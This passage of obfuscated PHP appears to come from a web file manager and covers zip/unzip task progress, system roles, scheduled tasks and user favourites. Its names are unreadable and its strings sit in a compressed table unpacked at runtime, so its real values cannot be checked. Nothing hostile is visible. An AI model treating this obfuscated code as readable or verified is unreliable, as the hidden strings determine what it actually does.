(!$Ó¸º­“ && !self::$asyncAdd) { return; } $âÌ¥Í¨– = $…˜ä±¨ü[1878]; $üõ§ ¶ = Cache::get($âÌ¥Í¨–, !0); if (!$üõ§ ¶ || count($üõ§ ¶) <= 0) { return; } $Ì ¨æğµ = !1; $€îÕàëÇ = timeFloat(); $™Û§ï¿ = array(); foreach ($üõ§ ¶ as $ìã›Ç­Í => $§†ç¦™÷) { if ($€îÕàëÇ - $§†ç¦™÷[$…˜ä±¨ü[1880]] > $§†ç¦™÷[$…˜ä±¨ü[206]]) { $Ì ¨æğµ = !0; try { Hook::apply($§†ç¦™÷[$…˜ä±¨ü[343]], $§†ç¦™÷[$…˜ä±¨ü[1870]]); write_log($…˜ä±¨ü[1883] . $ìã›Ç­Í . $…˜ä±¨ü[74] . $§†ç¦™÷[$…˜ä±¨ü[343]] . $…˜ä±¨ü[1884] . ACTION, $…˜ä±¨ü[197]); } catch (Exception $±ûÛ÷«¢) { } continue; } $™Û§ï¿[$ìã›Ç­Í] = $§†ç¦™÷; } if (!$Ì ¨æğµ) { return; } if (!$™Û§ï¿) { return Cache::remove($âÌ¥Í¨–); } Cache::set($âÌ¥Í¨–, $™Û§ï¿, 60); Cache::removeMemory($âÌ¥Í¨–); } public static function finished($…á£Á©, $€ùÓî¸—) { $İöˆ•ã =& $_SERVER[Š—Â“œÔ]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($İöˆ•ã[343] => $…á£Á©, $İöˆ•ã[1870] => $€ùÓî¸—); } private static function finishedRun() { $´“µÎ„ï =& $_SERVER[Š—Â“œÔ]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $×’áÅ³•) { try { Hook::apply($×’áÅ³•[$´“µÎ„ï[343]], $×’áÅ³•[$´“µÎ„ï[1870]]); } catch (Exception $İ‡È‰Ëğ) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $Åâôï¨  =& $_SERVER[Š—Â“œÔ]; parent::startAfter(); Hook::bind($Åâôï¨ [1885], array($this, $Åâôï¨ [1886])); Hook::bind($Åâôï¨ [1275], array($this, $Åâôï¨ [1887])); Hook::bind($Åâôï¨ [1888], array($this, $Åâôï¨ [1889])); $Ï©ùÍ•‘ =& $this->task; $Ï©ùÍ•‘[$Åâôï¨ [1890]] = $Åâôï¨ [1276]; if (!$Ï©ùÍ•‘[$Åâôï¨ [1658]]) { $Ï©ùÍ•‘[$Åâôï¨ [1658]] = LNG($Åâôï¨ [1891]); } } protected function endAfter() { $ˆˆÌĞ½Ô =& $_SERVER[Š—Â“œÔ]; parent::endAfter(); Hook::unbind($ˆˆÌĞ½Ô[1885], array($this, $ˆˆÌĞ½Ô[1886])); Hook::unbind($ˆˆÌĞ½Ô[1275], array($this, $ˆˆÌĞ½Ô[1887])); Hook::unbind($ˆˆÌĞ½Ô[1888], array($this, $ˆˆÌĞ½Ô[1889])); } public function updateAfter() { $Ä¾‹Ÿ˜İ =& $_SERVER[Š—Â“œÔ]; $±¨õ¶úÀ =& $this->task; if (!$±¨õ¶úÀ[$Ä¾‹Ÿ˜İ[1137]] || !$±¨õ¶úÀ[$Ä¾‹Ÿ˜İ[830]]) { if ($±¨õ¶úÀ[$Ä¾‹Ÿ˜İ[1890]] != $Ä¾‹Ÿ˜İ[390]) { return; } } if ($±¨õ¶úÀ[$Ä¾‹Ÿ˜İ[1890]] == $Ä¾‹Ÿ˜İ[1276]) { $ƒ‡–îú = 0; if ($±¨õ¶úÀ[$Ä¾‹Ÿ˜İ[1824]]) { $ƒ‡–îú = $±¨õ¶úÀ[$Ä¾‹Ÿ˜İ[1825]] / $±¨õ¶úÀ[$Ä¾‹Ÿ˜İ[1824]]; } $±¨õ¶úÀ[$Ä¾‹Ÿ˜İ[1772]] = $ƒ‡–îú * 0.3; } else { if ($±¨õ¶úÀ[$Ä¾‹Ÿ˜İ[1890]] == $Ä¾‹Ÿ˜İ[390]) { $ƒ‡–îú = $±¨õ¶úÀ[$Ä¾‹Ÿ˜İ[1771]] / $±¨õ¶úÀ[$Ä¾‹Ÿ˜İ[1137]]; $±¨õ¶úÀ[$Ä¾‹Ÿ˜İ[1772]] = 0.3 + $ƒ‡–îú * 0.4; } else { if ($±¨õ¶úÀ[$Ä¾‹Ÿ˜İ[1890]] == $Ä¾‹Ÿ˜İ[110]) { $‰Ö¬»Æ = 0; if ($±¨õ¶úÀ[$Ä¾‹Ÿ˜İ[1826]] == $Ä¾‹Ÿ˜İ[110]) { $‰Ö¬»Æ = $±¨õ¶úÀ[$Ä¾‹Ÿ˜İ[1825]]; } $ƒ‡–îú = ($±¨õ¶úÀ[$Ä¾‹Ÿ˜İ[1829]] + $‰Ö¬»Æ) / $±¨õ¶úÀ[$Ä¾‹Ÿ˜İ[830]]; $±¨õ¶úÀ[$Ä¾‹Ÿ˜İ[1772]] = 0.3 + 0.4 + $ƒ‡–îú * 0.3; } } } if ($±¨õ¶úÀ[$Ä¾‹Ÿ˜İ[1772]] > 0) { $ŠÕó¬¥œ = timeFloat() - $±¨õ¶úÀ[$Ä¾‹Ÿ˜İ[1774]] - $±¨õ¶úÀ[$Ä¾‹Ÿ˜İ[1777]]; $±¨õ¶úÀ[$Ä¾‹Ÿ˜İ[1778]] = $ŠÕó¬¥œ * (1 - $±¨õ¶úÀ[$Ä¾‹Ÿ˜İ[1772]]) / $±¨õ¶úÀ[$Ä¾‹Ÿ˜İ[1772]]; } } public function addFile($ĞÉÅ÷€Ô) { $ÉÊíêÅ± =& $_SERVER[Š—Â“œÔ]; $ºş¬î¶ =& $this->task; $ˆÆË¤Œ = IO::info($ĞÉÅ÷€Ô); $ºş¬î¶[$ÉÊíêÅ±[1822]] = $ˆÆË¤Œ[$ÉÊíêÅ±[32]]; $ºş¬î¶[$ÉÊíêÅ±[1824]] = $ˆÆË¤Œ[$ÉÊíêÅ±[79]]; $ºş¬î¶[$ÉÊíêÅ±[1825]] = 0; $ºş¬î¶[$ÉÊíêÅ±[1139]] = $ÉÊíêÅ±[1845]; $ºş¬î¶[$ÉÊíêÅ±[1826]] = $ÉÊíêÅ±[1276]; $ºş¬î¶[$ÉÊíêÅ±[830]] = $ˆÆË¤Œ[$ÉÊíêÅ±[79]]; $ºş¬î¶[$ÉÊíêÅ±[1137]] = 1; $¤ıæ¬Õ¨ = 0; $ºş¬î¶[$ÉÊíêÅ±[1833]] = array($ÉÊíêÅ±[1834] => $¤ıæ¬Õ¨ + 1, $ÉÊíêÅ±[496] => $ˆÆË¤Œ[$ÉÊíêÅ±[32]], $ÉÊíêÅ±[87] => $ˆÆË¤Œ[$ÉÊíêÅ±[87]], $ÉÊíêÅ±[584] => $ˆÆË¤Œ[$ÉÊíêÅ±[584]] ? $ˆÆË¤Œ[$ÉÊíêÅ±[584]] : $ˆÆË¤Œ[$ÉÊíêÅ±[87]]); $this->update(); } public function zipEvent($çµÑ™ãí, $ºƒé¸ÚÊ, $öÍíá´½, $Ÿ³•¤…ı) { $¨îÇ“Ê¦ =& $_SERVER[Š—Â“œÔ]; $ìïŞ‰’ =& $this->task; $ìïŞ‰’[$¨îÇ“Ê¦[1822]] = get_path_this($ºƒé¸ÚÊ); $ìïŞ‰’[$¨îÇ“Ê¦[1824]] = $Ÿ³•¤…ı; $ìïŞ‰’[$¨îÇ“Ê¦[1825]] = $öÍíá´½; $ìïŞ‰’[$¨îÇ“Ê¦[1139]] = $çµÑ™ãí == $¨îÇ“Ê¦[1892] ? $¨îÇ“Ê¦[1893] : $¨îÇ“Ê¦[1894]; $ìïŞ‰’[$¨îÇ“Ê¦[1826]] = $¨îÇ“Ê¦[12]; $ìïŞ‰’[$¨îÇ“Ê¦[830]] = $Ÿ³•¤…ı; $ìïŞ‰’[$¨îÇ“Ê¦[1890]] = $¨îÇ“Ê¦[390]; $this->update(); } public function unzipAfter($ÇÈÈÊ Î) { $áÙ•§Ù =& $_SERVER[Š—Â“œÔ]; $ºåˆº· =& $this->task; $ºåˆº·[$áÙ•§Ù[1890]] = $áÙ•§Ù[110]; $”ıÅÕ“€ = IO::infoWithChildren($ÇÈÈÊ Î); $İ†³ã‚ = 0; $ºåˆº·[$áÙ•§Ù[1833]] = array($áÙ•§Ù[1834] => $İ†³ã‚ + 1, $áÙ•§Ù[496] => $”ıÅÕ“€[$áÙ•§Ù[32]], $áÙ•§Ù[87] => $”ıÅÕ“€[$áÙ•§Ù[87]], $áÙ•§Ù[584] => $”ıÅÕ“€[$áÙ•§Ù[584]] ? $”ıÅÕ“€[$áÙ•§Ù[584]] : $”ıÅÕ“€[$áÙ•§Ù[87]]); if ($”ıÅÕ“€[$áÙ•§Ù[33]] == $áÙ•§Ù[232]) { $ºåˆº·[$áÙ•§Ù[1137]] = 1; } else { $ºåˆº·[$áÙ•§Ù[1137]] = $”ıÅÕ“€[$áÙ•§Ù[82]][$áÙ•§Ù[80]]; } $ºåˆº·[$áÙ•§Ù[1139]] = $áÙ•§Ù[12]; $ºåˆº·[$áÙ•§Ù[1826]] = 0; $ºåˆº·[$áÙ•§Ù[1771]] = 0; $ºåˆº·[$áÙ•§Ù[1824]] = 0; $ºåˆº·[$áÙ•§Ù[1825]] = 0; $ºåˆº·[$áÙ•§Ù[1822]] = $áÙ•§Ù[12]; $ºåˆº·[$áÙ•§Ù[1829]] = 0; $ºåˆº·[$áÙ•§Ù[830]] = $”ıÅÕ“€[$áÙ•§Ù[79]]; $this->update(); self::log($áÙ•§Ù[1895] . json_encode(array($ºåˆº·, $”ıÅÕ“€))); } public function nameParse($øĞÉš¨ı) { $£šãÙ€ =& $_SERVER[Š—Â“œÔ]; $ë‘é¢À„ =& $this->task; if ($ë‘é¢À„[$£šãÙ€[1890]] == $£šãÙ€[1276]) { $ë‘é¢À„[$£šãÙ€[1890]] = $£šãÙ€[390]; $ë‘é¢À„[$£šãÙ€[1829]] = 0; $ë‘é¢À„[$£šãÙ€[830]] = 0; } $®ÃóŞ‚’ = get_path_this($øĞÉš¨ı); if (strstr($®ÃóŞ‚’, $£šãÙ€[10])) { $ë‘é¢À„[$£šãÙ€[1771]] += 1; $ë‘é¢À„[$£šãÙ€[1137]] += 1; } $ë‘é¢À„[$£šãÙ€[1822]] = $øĞÉš¨ı; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $›îµÙøº =& $_SERVER[Š—Â“œÔ]; parent::startAfter(); Hook::bind($›îµÙøº[1896], array($this, $›îµÙøº[1886])); Hook::bind($›îµÙøº[1888], array($this, $›îµÙøº[1889])); $¡ô„’ Å =& $this->task; $¡ô„’ Å[$›îµÙøº[1890]] = $›îµÙøº[1276]; if (!$¡ô„’ Å[$›îµÙøº[1658]]) { $¡ô„’ Å[$›îµÙøº[1658]] = LNG($›îµÙøº[1897]); } } protected function endAfter() { $ŞÙÜÌØÅ =& $_SERVER[Š—Â“œÔ]; parent::endAfter(); Hook::unbind($ŞÙÜÌØÅ[1896], array($this, $ŞÙÜÌØÅ[1886])); Hook::unbind($ŞÙÜÌØÅ[1888], array($this, $ŞÙÜÌØÅ[1889])); } public function updateAfter() { $üËî’å =& $_SERVER[Š—Â“œÔ]; $±â÷‹Âº =& $this->task; if (!$±â÷‹Âº[$üËî’å[1137]] || !$±â÷‹Âº[$üËî’å[830]]) { return; } if ($±â÷‹Âº[$üËî’å[1890]] == $üËî’å[1276]) { $Ú£Àœü® = $±â÷‹Âº[$üËî’å[1825]]; if ($±â÷‹Âº[$üËî’å[1826]] != $üËî’å[1276]) { $Ú£Àœü® = 0; } $ñÚò“®â = ($±â÷‹Âº[$üËî’å[1829]] + $Ú£Àœü®) / $±â÷‹Âº[$üËî’å[830]]; $±â÷‹Âº[$üËî’å[1772]] = $ñÚò“®â * 0.3; } else { if ($±â÷‹Âº[$üËî’å[1890]] == $üËî’å[390]) { $ñÚò“®â = $±â÷‹Âº[$üËî’å[1771]] / $±â÷‹Âº[$üËî’å[1137]]; $±â÷‹Âº[$üËî’å[1772]] = 0.3 + $ñÚò“®â * 0.5; } else { if ($±â÷‹Âº[$üËî’å[1890]] == $üËî’å[110]) { $ñÚò“®â = 0; if ($±â÷‹Âº[$üËî’å[1824]]) { $ñÚò“®â = $±â÷‹Âº[$üËî’å[1825]] / $±â÷‹Âº[$üËî’å[1824]]; } $±â÷‹Âº[$üËî’å[1772]] = 0.3 + 0.5 + $ñÚò“®â * 0.2; } } } if ($±â÷‹Âº[$üËî’å[1772]] > 0) { $ã€Ç€£Ç = timeFloat() - $±â÷‹Âº[$üËî’å[1774]] - $±â÷‹Âº[$üËî’å[1777]]; $±â÷‹Âº[$üËî’å[1778]] = $ã€Ç€£Ç * (1 - $±â÷‹Âº[$üËî’å[1772]]) / $±â÷‹Âº[$üËî’å[1772]]; } } public function copyFileStart($öÇà¨°½, $¸Ğê «, $•ÀòË˜ã, $¸œŠó‹š, $ôª€ªÛ , $ş«éÒùÆ) { $Œ€Ì‚³ğ =& $_SERVER[Š—Â“œÔ]; parent::copyFileStart($öÇà¨°½, $¸Ğê «, $•ÀòË˜ã, $¸œŠó‹š, $ôª€ªÛ , $ş«éÒùÆ); $ûı¥ª£Â =& $this->task; if ($ûı¥ª£Â[$Œ€Ì‚³ğ[1890]] == $Œ€Ì‚³ğ[390]) { $ûı¥ª£Â[$Œ€Ì‚³ğ[1890]] = $Œ€Ì‚³ğ[110]; } $this->update(); } public function copyFileEnd($Æ˜ü¶Û¥, $»¡ƒ•Î, $ÂÖÌú ², $ª­’ß®, $èï×›½À, $â¾ÇÁÁ£) { $‰¡Éä» =& $_SERVER[Š—Â“œÔ]; $³À©Œ”´ =& $this->task; $³À©Œ”´[$‰¡Éä»[1825]] = $³À©Œ”´[$‰¡Éä»[1824]]; $³À©Œ”´[$‰¡Éä»[1829]] += $³À©Œ”´[$‰¡Éä»[1824]]; $³À©Œ”´[$‰¡Éä»[1826]] = $‰¡Éä»[12]; $this->update(); } public function zipEvent($ğş‚¿¶š, $Âí‡ÒÓê, $û¦–ãæó, $šÜÀàÔá) { $®¤ö«Íğ =& $_SERVER[Š—Â“œÔ]; $Ôçà¯ûó =& $this->task; $Ôçà¯ûó[$®¤ö«Íğ[1822]] = get_path_this($Âí‡ÒÓê); $Ôçà¯ûó[$®¤ö«Íğ[1824]] = $šÜÀàÔá; $Ôçà¯ûó[$®¤ö«Íğ[1825]] = $û¦–ãæó; $Ôçà¯ûó[$®¤ö«Íğ[1139]] = $ğş‚¿¶š == $®¤ö«Íğ[1898] ? $®¤ö«Íğ[1893] : $®¤ö«Íğ[1894]; $Ôçà¯ûó[$®¤ö«Íğ[1826]] = $®¤ö«Íğ[12]; $Ôçà¯ûó[$®¤ö«Íğ[830]] = $šÜÀàÔá; $Ôçà¯ûó[$®¤ö«Íğ[1890]] = $®¤ö«Íğ[390]; $this->update(); } public function nameParse($¿•×ûˆ) { $‰‚®„‹½ =& $_SERVER[Š—Â“œÔ]; $æŸ•ÆÇ =& $this->task; if ($æŸ•ÆÇ[$‰‚®„‹½[1771]] < $æŸ•ÆÇ[$‰‚®„‹½[1137]]) { $ó”¿¨‘Š = get_path_this($¿•×ûˆ); if (strstr($ó”¿¨‘Š, $‰‚®„‹½[10])) { $æŸ•ÆÇ[$‰‚®„‹½[1771]] += 1; } } if ($æŸ•ÆÇ[$‰‚®„‹½[1890]] == $‰‚®„‹½[1276]) { $æŸ•ÆÇ[$‰‚®„‹½[1890]] = $‰‚®„‹½[390]; } $æŸ•ÆÇ[$‰‚®„‹½[1822]] = $¿•×ûˆ; $this->update(); } } goto F™İ«Ş¦†; b‘ÄäË†Öù: define($_SERVER[Š—Â“œÔ][0], $_SERVER[Š—Â“œÔ][1]); $_SERVER[Ü—Úç¿‹] = explode($_SERVER[Š—Â“œÔ][2], gzinflate(substr($_SERVER[Š—Â“œÔ][3], 10, -8))); function binCheckEq($õÉÖœœ, $È´’…ÏŞ) { return $õÉÖœœ == $È´’…ÏŞ; } goto Açéé‚ç²±; aâíğÕôç: class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\155\56\162\157\154\145\114\151\163\x74"; public $field = array("\156\141\x6d\x65", "\x61\x75\x74\x68", "\154\x61\142\x65\154", "\144\x69\x73\160\154\141\x79", "\163\171\163\164\x65\155", "\144\145\163\x63", "\x69\x67\156\157\x72\145\105\x78\164", "\151\147\156\x6f\162\x65\x46\x69\x6c\145\123\x69\172\x65", "\141\144\155\151\156\x69\x73\x74\x72\141\x74\x6f\162", "\163\157\162\x74"); public function listData($ÔöÍÁãå = false, $Ó¿ğÕŠÆ = "\163\157\162\164", $€çŞ¼‹ = false) { $¶ª§óÊ… =& $_SERVER[Š—Â“œÔ]; $òúå•Å‡ = parent::listData($ÔöÍÁãå, $Ó¿ğÕŠÆ, $€çŞ¼‹); if (!$ÔöÍÁãå) { foreach ($òúå•Å‡ as $¥ëÂŞ¦« => $¡ŞşŸÖ¿) { if ($¡ŞşŸÖ¿[$¶ª§óÊ…[2179]] == 1) { $òúå•Å‡[$¥ëÂŞ¦«][$¶ª§óÊ…[528]] = LNG($¶ª§óÊ…[2448]); } } } return $òúå•Å‡; } public function update($ïÀ„×‡Ã, $¢ŸÁê¿) { $µÇ†Æ£ =& $_SERVER[Š—Â“œÔ]; $şÎ‡Õèı = parent::listData($ïÀ„×‡Ã); $ãš¿ˆÄø = $this->findByName($¢ŸÁê¿[$µÇ†Æ£[32]]); if (!$şÎ‡Õèı || $ãš¿ˆÄø && $ãš¿ˆÄø[$µÇ†Æ£[477]] != $şÎ‡Õèı[$µÇ†Æ£[477]]) { return !1; } if ($ãš¿ˆÄø[$µÇ†Æ£[2179]] == 1) { $¢ŸÁê¿ = array($µÇ†Æ£[32] => $¢ŸÁê¿[$µÇ†Æ£[32]], $µÇ†Æ£[1994] => $¢ŸÁê¿[$µÇ†Æ£[1994]]); } $this->filterAuth($¢ŸÁê¿[$µÇ†Æ£[489]]); return parent::update($ïÀ„×‡Ã, $¢ŸÁê¿); } public function remove($œùçàĞ½) { $®íµœ˜ı = parent::listData($œùçàĞ½); if (!$®íµœ˜ı || $®íµœ˜ı[$_SERVER[Š—Â“œÔ][191]]) { return !1; } return parent::remove($œùçàĞ½); } public function add($²–Å»¨¤) { $ø¿×Ğ©İ =& $_SERVER[Š—Â“œÔ]; $û¾â´ªÃ = $²–Å»¨¤[$ø¿×Ğ©İ[32]]; if ($this->findByName($û¾â´ªÃ)) { return !1; } $¢‰¹•ª€ = array($ø¿×Ğ©İ[496] => $û¾â´ªÃ, $ø¿×Ğ©İ[1977] => $ø¿×Ğ©İ[12], $ø¿×Ğ©İ[1973] => $ø¿×Ğ©İ[1981], $ø¿×Ğ©İ[2449] => 1, $ø¿×Ğ©İ[1976] => 0, $ø¿×Ğ©İ[2450] => 0, $ø¿×Ğ©İ[1975] => $this->getSort()); $²–Å»¨¤ = array_merge($¢‰¹•ª€, $²–Å»¨¤); $this->filterAuth($²–Å»¨¤[$ø¿×Ğ©İ[489]]); return parent::insert($²–Å»¨¤); } private function getSort() { $šã¼°×ï =& $_SERVER[Š—Â“œÔ]; $¿¦íÄ¸ô = parent::listData(); $Ù°ìó¹™ = array_to_keyvalue($¿¦íÄ¸ô, $šã¼°×ï[12], $šã¼°×ï[1995]); return empty($Ù°ìó¹™) ? 0 : max($Ù°ìó¹™) + 1; } private function filterAuth(&$©“‡éû) { $«Š–Äõ— =& $_SERVER[Š—Â“œÔ]; $Ô¹ğ‚è = array(); $åàˆÚïæ = array_filter(explode($«Š–Äõ—[50], $©“‡éû)); foreach ($åàˆÚïæ as $©“‡éû) { $ı‡Àµ»Ä = explode($«Š–Äõ—[10], $©“‡éû); if ($ı‡Àµ»Ä[0] == $«Š–Äõ—[2451] && $ı‡Àµ»Ä[1] != $«Š–Äõ—[1272]) { $àÄ­¬€Û = $ı‡Àµ»Ä[0] . $«Š–Äõ—[10] . $ı‡Àµ»Ä[1] . $«Š–Äõ—[2452]; if (!in_array($àÄ­¬€Û, $åàˆÚïæ)) { $Ô¹ğ‚è[] = $àÄ­¬€Û; } } $Ô¹ğ‚è[] = $©“‡éû; } $©“‡éû = implode($«Š–Äõ—[50], $Ô¹ğ‚è); } public function findRoleDefault() { $¤´€åà£ =& $_SERVER[Š—Â“œÔ]; $ÌÃ›ëÙÜ = parent::listData(); $­’ÒŸè³ = !1; foreach ($ÌÃ›ëÙÜ as $ãÁÇÇã¯) { if (!$ãÁÇÇã¯ || $ãÁÇÇã¯[$¤´€åà£[1993]] == $¤´€åà£[230] || $ãÁÇÇã¯[$¤´€åà£[2179]] == 1) { continue; } if (strstr($ãÁÇÇã¯[$¤´€åà£[489]], $¤´€åà£[2453])) { continue; } if (!strstr($ãÁÇÇã¯[$¤´€åà£[489]], $¤´€åà£[2454])) { continue; } if (!$­’ÒŸè³) { $­’ÒŸè³ = $ãÁÇÇã¯; continue; } $¥û—á¾… = explode($¤´€åà£[50], $­’ÒŸè³[$¤´€åà£[489]]); $ĞÕ–¢Š = explode($¤´€åà£[50], $ãÁÇÇã¯[$¤´€åà£[489]]); if (count($¥û—á¾…) > count($ĞÕ–¢Š)) { $­’ÒŸè³ = $ãÁÇÇã¯; } } return $­’ÒŸè³ ? $­’ÒŸè³[$¤´€åà£[477]] : $¤´€åà£[12]; } public function sort($“£õ§“ñ, $³Åê˜ÄÅ) { return parent::update($“£õ§“ñ, $³Åê˜ÄÅ); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\155\56\164\x61\x73\x6b\x4c\x69\x73\164"; public $field = array("\156\x61\155\145", "\164\171\x70\145", "\145\x76\145\x6e\164", "\x74\151\x6d\145", "\x64\145\x73\143", "\163\x79\163\x74\145\x6d", "\145\x6e\141\x62\x6c\145", "\x6c\x61\163\164\x52\165\x6e", "\163\157\x72\164"); public function listData($¦é¢—¹ = false, $£ Úœ¸ = "\x73\157\162\164", $‰ÔÄ¥ÔÍ = false) { return parent::listData($¦é¢—¹, $£ Úœ¸, $‰ÔÄ¥ÔÍ); } public function add($¸çÑ†Ş„) { $û—Íşû =& $_SERVER[Š—Â“œÔ]; $“¿èûã = $this->findByName($¸çÑ†Ş„[$û—Íşû[32]]); if ($“¿èûã) { return !1; } $¸çÑ†Ş„[$û—Íşû[1720]] = 0; $¸çÑ†Ş„[$û—Íşû[1995]] = $this->getSort(); return parent::insert($¸çÑ†Ş„); } private function getSort() { $ç®øşì =& $_SERVER[Š—Â“œÔ]; $Ã¹Ş‘Á« = parent::listData(); $…•ØÓÏ× = array_to_keyvalue($Ã¹Ş‘Á«, $ç®øşì[12], $ç®øşì[1995]); return empty($…•ØÓÏ×) ? 0 : max($…•ØÓÏ×) + 1; } public function update($®¿ŞüÄ, $¢æÌ‹¡¯) { $õÕÑÅ’¯ =& $_SERVER[Š—Â“œÔ]; $‘Öõ™äù = $this->listData($®¿ŞüÄ); $°Ó½ÆÙù = $this->findByName($¢æÌ‹¡¯[$õÕÑÅ’¯[32]]); if (!$‘Öõ™äù || $°Ó½ÆÙù && $°Ó½ÆÙù[$õÕÑÅ’¯[477]] != $‘Öõ™äù[$õÕÑÅ’¯[477]]) { return !1; } return parent::update($®¿ŞüÄ, $¢æÌ‹¡¯); } public function remove($ÔéòÒ™ü, $¦À²³Ì­ = false) { $Š°ô®å² =& $_SERVER[Š—Â“œÔ]; $ÏÕ‰‹÷Õ = $this->listData($ÔéòÒ™ü); if (!$ÏÕ‰‹÷Õ) { return; } if (!$¦À²³Ì­ && $ÏÕ‰‹÷Õ[$Š°ô®å²[191]] == $Š°ô®å²[91]) { return !1; } return parent::remove($ÔéòÒ™ü); } public function enable($øÔ½•Ê, $¿Æ¹¼µ‡) { return $this->update($øÔ½•Ê, array($_SERVER[Š—Â“œÔ][2443] => $¿Æ¹¼µ‡)); } public function run($·€ûÚ) { return $this->update($·€ûÚ, array($_SERVER[Š—Â“œÔ][2455] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\163\x65\162\x5f\146\x61\166"; protected function cacheFunctionAlias($·¥õŠ†) { $šõæÕ€ =& $_SERVER[Š—Â“œÔ]; return array($šõæÕ€[2086] => array(USER_ID, $šõæÕ€[2456])); } protected function listData() { $œÍÛ•Öô =& $_SERVER[Š—Â“œÔ]; $€Èô¬¶ª = array($œÍÛ•Öô[1761] => USER_ID, $œÍÛ•Öô[559] => 0); $˜ñº¤ï• = $œÍÛ•Öô[2457]; $ŠƒØƒ«ï = $this->field($˜ñº¤ï•)->where($€Èô¬¶ª)->order($œÍÛ•Öô[2458])->select(); return $ŠƒØƒ«ï ? $ŠƒØƒ«ï : array(); } protected function resetCache() { } protected function listView() { $¤Â°½ ú =& $_SERVER[Š—Â“œÔ]; $Ñ”şŞ· = $this->listData(); $ùÒŠ§½ì = array_filter_by_field($Ñ”şŞ·, $¤Â°½ ú[33], $¤Â°½ ú[492]); $ò˜õ©Ï© = array_to_keyvalue($ùÒŠ§½ì, $¤Â°½ ú[12], $¤Â°½ ú[87]); if (!$ò˜õ©Ï©) { return $Ñ”şŞ·; } $¸§Øî› = 2000; $ŞÚÆ³ö¥ = array($¤Â°½ ú[493] => array($¤Â°½ ú[494], $ò˜õ©Ï©)); $àú£µÙã = Model($¤Â°½ ú[892])->listSource($ŞÚÆ³ö¥, $¸§Øî›); $àú£µÙã = array_merge($àú£µÙã[$¤Â°½ ú[86]], $àú£µÙã[$¤Â°½ ú[85]]); $àú£µÙã = array_to_keyvalue($àú£µÙã, $¤Â°½ ú[193]); foreach ($Ñ”şŞ· as $ËÁß¬¬À => $¡´ñÀÂ ) { $×ÍÒı³¶ = $àú£µÙã[$¡´ñÀÂ [$¤Â°½ ú[87]]]; $×ÍÒı³¶ = $×ÍÒı³¶ ? $×ÍÒı³¶ : array(); $Ñ”şŞ·[$ËÁß¬¬À] = array_merge($×ÍÒı³¶, $¡´ñÀÂ ); } return $Ñ”şŞ·; } protected function addFav($Êø£ı»À, $Ôš½ùê° = '', $–ƒ•¼º„ = "\163\157\165\162\143\145") { $Ö¦“é =& $_SERVER[Š—Â“œÔ]; $½€ßÀ÷’ = array($Ö¦“é[1761] => USER_ID, $Ö¦“é[559] => 0, $Ö¦“é[498] => $–ƒ•¼º„, $Ö¦“é[497] => $Êø£ı»À); if ($this->where($½€ßÀ÷’)->find()) { return !1; } $½€ßÀ÷’ = array($Ö¦“é[1761] => USER_ID, $Ö¦“é[559] => 0); $²ƒûÑ¤ó = $this->where($½€ßÀ÷’)->max($Ö¦“é[1995]); if (!$²ƒûÑ¤ó) { $²ƒûÑ¤ó = 0; } if (!$Ôš½ùê° && $–ƒ•¼º„ == $Ö¦“é[492]) { $æ‘‚‡ö = Model($Ö¦“é[1419])->where(array($Ö¦“é[493] => $Êø£ı»À))->find(); if (!$æ‘‚‡ö) { return !1; } $Ôš½ùê° = $æ‘‚‡ö[$Ö¦“é[32]]; } $Ôš½ùê° = $this->getAutoName($Ôš½ùê°); $£ØòÕ«Ÿ = array($Ö¦“é[1761] => USER_ID, $Ö¦“é[559] => 0, $Ö¦“é[496] => $Ôš½ùê°, $Ö¦“é[497] => $Êø£ı»À, $Ö¦“é[498] => $–ƒ•¼º„, $Ö¦“é[1975] => $²ƒûÑ¤ó + 1); return $this->add($£ØòÕ«Ÿ); } protected function remove($³ÓÛãë) { $§ŸÜĞ¹• =& $_SERVER[Š—Â“œÔ]; $Úı€Šî¼ = array($§ŸÜĞ¹•[1761] => USER_ID, $§ŸÜĞ¹•[495] => $³ÓÛãë); return $this->where($Úı€Šî¼)->delete(); } protected function removeByName($ÛúËôó») { $×„°’“Æ =& $_SERVER[Š—Â“œÔ]; $¼Šüó‡¡ = array($×„°’“Æ[1761] => USER_ID, $×„°’“Æ[496] => $ÛúËôó», $×„°’“Æ[559] => 0); return $this->where($¼Šüó‡¡)->delete(); } protected function rename($ª–ºÀ…, $›ş“½œş) { $šÆØöù =& $_SERVER[Š—Â“œÔ]; if ($ª–ºÀ… == $›ş“½œş) { return !1; } $ÇçÒ©Ä§ = $this->getAutoName($›ş“½œş); if ($›ş“½œş != $ÇçÒ©Ä§) { return !1; } $É¨ôˆÆø = array($šÆØöù[1761] => USER_ID, $šÆØöù[559] => 0, $šÆØöù[32] => $ª–ºÀ…); return $this->where($É¨ôˆÆø)->save(array($šÆØöù[32] => $›ş“½œş)); } protected function resetSort($–™Úı®) { $ğ²Äƒ =& $_SERVER[Š—Â“œÔ]; $–™Úı® = is_array($–™Úı®) ? $–™Úı® : array(); $ñ½ò·¥ = array($ğ²Äƒ[1761] => USER_ID); for ($û¿Ô ò› = 0; $û¿Ô ò› < count($–™Úı®); $û¿Ô ò›++) { $ñ½ò·¥[$ğ²Äƒ[495]] = $–™Úı®[$û¿Ô ò›]; $this->where($ñ½ò·¥)->save(array($ğ²Äƒ[1975] => $û¿Ô ò› + 1)); } return !0; } protected function moveTop($£åàÛº°) { $‚ûğ³‹Ğ =& $_SERVER[Š—Â“œÔ]; $È–ÉãÕä = array($‚ûğ³‹Ğ[1761] => USER_ID, $‚ûğ³‹Ğ[559] => 0); $¡ùî¼ç = $this->where($È–ÉãÕä)->where(array($‚ûğ³‹Ğ[32] => $£åàÛº°))->find(); if (!$¡ùî¼ç) { return; } $à†Äã„â = $this->field($‚ûğ³‹Ğ[477])->where($È–ÉãÕä)->order($‚ûğ³‹Ğ[2458])->select(); $à†Äã„â = array_to_keyvalue($à†Äã„â, $‚ûğ³‹Ğ[12], $‚ûğ³‹Ğ[477]); $ƒ‹ÈŸµè = $à†Äã„â; $à†Äã„â = array_remove_value($à†Äã„â, $¡ùî¼ç[$‚ûğ³‹Ğ[477]]); array_unshift($à†Äã„â, 